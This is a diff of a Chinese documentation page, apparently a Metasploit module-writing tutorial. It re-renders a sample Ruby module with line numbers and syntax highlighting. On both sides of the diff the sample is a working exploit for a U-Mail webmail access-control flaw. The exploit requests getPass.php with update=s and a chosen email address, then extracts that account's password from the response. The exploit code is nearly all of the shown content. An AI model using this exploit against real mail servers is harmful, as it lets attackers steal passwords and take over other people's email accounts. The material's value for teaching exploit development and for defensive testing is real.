@@ -114,62 +114,115 @@ vi umail_pass.rb
 </pre></div>
 </div>
 <p>示例代码如下:</p>
-<div class="highlight-python"><div class="highlight"><pre>#encoding:utf-8
-require &#39;msf/core&#39;
-class Metasploit3 &lt; Msf::Exploit::Remote
-  Rank = ExcellentRanking
-  include Msf::Exploit::Remote::HttpClient
+<div class="highlight-ruby"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54</pre></div></td><td class="code"><div class="highlight"><pre> <span class="c1">#encoding:utf-8</span>
+ <span class="nb">require</span> <span class="s1">&#39;msf/core&#39;</span>
+ <span class="k">class</span> <span class="nc">Metasploit3</span> <span class="o">&lt;</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Exploit</span><span class="o">::</span><span class="no">Remote</span>
+   <span class="no">Rank</span> <span class="o">=</span> <span class="no">ExcellentRanking</span>
+   <span class="kp">include</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Exploit</span><span class="o">::</span><span class="no">Remote</span><span class="o">::</span><span class="no">HttpClient</span>
 
-  def initialize(info={})
-    super(update_info(info,
-        &#39;Name&#39;           =&gt; &quot;U-Mail System Unauthorized Access Vulnerability&quot;,
-        &#39;Description&#39;    =&gt; %q{
-          　　U-Mail邮件系统权限设置问题导致任意用户密码可越权查看，当updata参数的值为s，只需将email参数的值指定为一个已存在的邮箱账号即可查看任意账户密码。
-        },
-        &#39;License&#39;        =&gt; MSF_LICENSE,
-        &#39;Author&#39;         =&gt;
-          [
-          &#39;Rain&#39;    #Metasploit-CNNS
-        ],
-        &#39;Platform&#39;        =&gt; [ &#39;php&#39; ],
-        &#39;Arch&#39;           =&gt; ARCH_PHP,
-        &#39;Targets&#39;        =&gt;[[ &#39;U-Mail&#39;, { }]],
-        &#39;Privileged&#39;     =&gt; false,
-        &#39;DisclosureDate&#39; =&gt; &quot;Apr 11 2011&quot;,
-        &#39;DefaultTarget&#39;  =&gt; 0))
-    register_options(
-      [
-        OptString.new(&#39;RHOST&#39;, [true, &#39;The DOMAIN&#39;, &#39;&#39;]),
-        OptString.new(&#39;RPORT&#39;, [true, &#39;The port&#39;, &#39;80&#39;]),
-        OptString.new(&#39;TARGETURI&#39;, [true, &#39;The base path to U-Mail&#39;, &#39;/webmail/&#39;]),
-        OptString.new(&#39;EMAIL&#39;, [true, &#39;The email to U-Mail&#39;, &#39;&#39;]),
-      ], self.class)
-  end
+   <span class="k">def</span> <span class="nf">initialize</span><span class="p">(</span><span class="n">info</span><span class="o">=</span><span class="p">{})</span>
+     <span class="k">super</span><span class="p">(</span><span class="n">update_info</span><span class="p">(</span><span class="n">info</span><span class="p">,</span>
+         <span class="s1">&#39;Name&#39;</span>           <span class="o">=&gt;</span> <span class="s2">&quot;U-Mail System Unauthorized Access Vulnerability&quot;</span><span class="p">,</span>
+         <span class="s1">&#39;Description&#39;</span>    <span class="o">=&gt;</span> <span class="sx">%q{</span>
+<span class="sx">           　　U-Mail邮件系统权限设置问题导致任意用户密码可越权查看，当updata参数的值为s，只需将email参数的值指定为一个已存在的邮箱账号即可查看任意账户密码。</span>
+<span class="sx">         }</span><span class="p">,</span>
+         <span class="s1">&#39;License&#39;</span>        <span class="o">=&gt;</span> <span class="no">MSF_LICENSE</span><span class="p">,</span>
+         <span class="s1">&#39;Author&#39;</span>         <span class="o">=&gt;</span>
+           <span class="o">[</span>
+           <span class="s1">&#39;Rain&#39;</span>    <span class="c1">#Metasploit-CNNS</span>
+         <span class="o">]</span><span class="p">,</span>
+         <span class="s1">&#39;Platform&#39;</span>        <span class="o">=&gt;</span> <span class="o">[</span> <span class="s1">&#39;php&#39;</span> <span class="o">]</span><span class="p">,</span>
+         <span class="s1">&#39;Arch&#39;</span>           <span class="o">=&gt;</span> <span class="no">ARCH_PHP</span><span class="p">,</span>
+         <span class="s1">&#39;Targets&#39;</span>        <span class="o">=&gt;[[</span> <span class="s1">&#39;U-Mail&#39;</span><span class="p">,</span> <span class="p">{</span> <span class="p">}</span><span class="o">]]</span><span class="p">,</span>
+         <span class="s1">&#39;Privileged&#39;</span>     <span class="o">=&gt;</span> <span class="kp">false</span><span class="p">,</span>
+         <span class="s1">&#39;DisclosureDate&#39;</span> <span class="o">=&gt;</span> <span class="s2">&quot;Apr 11 2011&quot;</span><span class="p">,</span>
+         <span class="s1">&#39;DefaultTarget&#39;</span>  <span class="o">=&gt;</span> <span class="mi">0</span><span class="p">))</span>
+     <span class="n">register_options</span><span class="p">(</span>
+       <span class="o">[</span>
+         <span class="no">OptString</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s1">&#39;RHOST&#39;</span><span class="p">,</span> <span class="o">[</span><span class="kp">true</span><span class="p">,</span> <span class="s1">&#39;The DOMAIN&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="o">]</span><span class="p">),</span>
+         <span class="no">OptString</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s1">&#39;RPORT&#39;</span><span class="p">,</span> <span class="o">[</span><span class="kp">true</span><span class="p">,</span> <span class="s1">&#39;The port&#39;</span><span class="p">,</span> <span class="s1">&#39;80&#39;</span><span class="o">]</span><span class="p">),</span>
+         <span class="no">OptString</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s1">&#39;TARGETURI&#39;</span><span class="p">,</span> <span class="o">[</span><span class="kp">true</span><span class="p">,</span> <span class="s1">&#39;The base path to U-Mail&#39;</span><span class="p">,</span> <span class="s1">&#39;/webmail/&#39;</span><span class="o">]</span><span class="p">),</span>
+         <span class="no">OptString</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s1">&#39;EMAIL&#39;</span><span class="p">,</span> <span class="o">[</span><span class="kp">true</span><span class="p">,</span> <span class="s1">&#39;The email to U-Mail&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="o">]</span><span class="p">),</span>
+       <span class="o">]</span><span class="p">,</span> <span class="nb">self</span><span class="o">.</span><span class="n">class</span><span class="p">)</span>
+   <span class="k">end</span>
 
-  def exploit
-    begin
-        res = send_request_cgi( {
-            &#39;method&#39; =&gt; &quot;GET&quot;,
-            &#39;uri&#39;    =&gt; normalize_uri(datastore[&#39;TARGETURI&#39;]) + &quot;/getPass.php?update=s&amp;email=#{datastore[&#39;EMAIL&#39;]}&quot;
-          }, 20)
-    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
-    rescue ::Timeout::Error, ::Errno::EPIPE
-    end
-      body_data = res.body.force_encoding(&#39;UTF-8&#39;)
-      if body_data =~ /你的密码是/
-        data = body_data.scan(/你的密码是\&lt;\/p\&gt;\&lt;p\&gt;\&lt;center\&gt;\&lt;font color=red\&gt;(.*?)\&lt;\/font\&gt;/)
-        if data and data.first and data.first.first
-          print_good(&quot;---------账号--------\n邮箱 = #{datastore[&#39;EMAIL&#39;]}, 密码 = #{data.first.first}&quot;, &quot;good&quot;)
-        else
-          print_error(&quot;漏洞利用失败！&quot;)
-        end
-      else
-        print_error(&quot;漏洞利用失败！&quot;)
-      end
-  end
-end
+   <span class="k">def</span> <span class="nf">exploit</span>
+     <span class="k">begin</span>
+         <span class="n">res</span> <span class="o">=</span> <span class="n">send_request_cgi</span><span class="p">(</span> <span class="p">{</span>
+             <span class="s1">&#39;method&#39;</span> <span class="o">=&gt;</span> <span class="s2">&quot;GET&quot;</span><span class="p">,</span>
+             <span class="s1">&#39;uri&#39;</span>    <span class="o">=&gt;</span> <span class="n">normalize_uri</span><span class="p">(</span><span class="n">datastore</span><span class="o">[</span><span class="s1">&#39;TARGETURI&#39;</span><span class="o">]</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&quot;/getPass.php?update=s&amp;email=</span><span class="si">#{</span><span class="n">datastore</span><span class="o">[</span><span class="s1">&#39;EMAIL&#39;</span><span class="o">]</span><span class="si">}</span><span class="s2">&quot;</span>
+           <span class="p">},</span> <span class="mi">20</span><span class="p">)</span>
+     <span class="k">rescue</span> <span class="o">::</span><span class="no">Rex</span><span class="o">::</span><span class="no">ConnectionRefused</span><span class="p">,</span> <span class="o">::</span><span class="no">Rex</span><span class="o">::</span><span class="no">HostUnreachable</span><span class="p">,</span> <span class="o">::</span><span class="no">Rex</span><span class="o">::</span><span class="no">ConnectionTimeout</span>
+     <span class="k">rescue</span> <span class="o">::</span><span class="no">Timeout</span><span class="o">::</span><span class="no">Error</span><span class="p">,</span> <span class="o">::</span><span class="no">Errno</span><span class="o">::</span><span class="no">EPIPE</span>
+     <span class="k">end</span>
+       <span class="n">body_data</span> <span class="o">=</span> <span class="n">res</span><span class="o">.</span><span class="n">body</span><span class="o">.</span><span class="n">force_encoding</span><span class="p">(</span><span class="s1">&#39;UTF-8&#39;</span><span class="p">)</span>
+       <span class="k">if</span> <span class="n">body_data</span> <span class="o">=~</span> <span class="sr">/你的密码是/</span>
+         <span class="n">data</span> <span class="o">=</span> <span class="n">body_data</span><span class="o">.</span><span class="n">scan</span><span class="p">(</span><span class="sr">/你的密码是\&lt;\/p\&gt;\&lt;p\&gt;\&lt;center\&gt;\&lt;font color=red\&gt;(.*?)\&lt;\/font\&gt;/</span><span class="p">)</span>
+         <span class="k">if</span> <span class="n">data</span> <span class="ow">and</span> <span class="n">data</span><span class="o">.</span><span class="n">first</span> <span class="ow">and</span> <span class="n">data</span><span class="o">.</span><span class="n">first</span><span class="o">.</span><span class="n">first</span>
+           <span class="n">print_good</span><span class="p">(</span><span class="s2">&quot;---------账号--------</span><span class="se">\n</span><span class="s2">邮箱 = </span><span class="si">#{</span><span class="n">datastore</span><span class="o">[</span><span class="s1">&#39;EMAIL&#39;</span><span class="o">]</span><span class="si">}</span><span class="s2">, 密码 = </span><span class="si">#{</span><span class="n">data</span><span class="o">.</span><span class="n">first</span><span class="o">.</span><span class="n">first</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;good&quot;</span><span class="p">)</span>
+         <span class="k">else</span>
+           <span class="n">print_error</span><span class="p">(</span><span class="s2">&quot;漏洞利用失败！&quot;</span><span class="p">)</span>
+         <span class="k">end</span>
+       <span class="k">else</span>
+         <span class="n">print_error</span><span class="p">(</span><span class="s2">&quot;漏洞利用失败！&quot;</span><span class="p">)</span>
+       <span class="k">end</span>
+   <span class="k">end</span>
+ <span class="k">end</span>
 </pre></div>
-</div>
+</td></tr></table></div>
 </div>
 <div class="section" id="id5">
 <h2>常见问题<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h2>
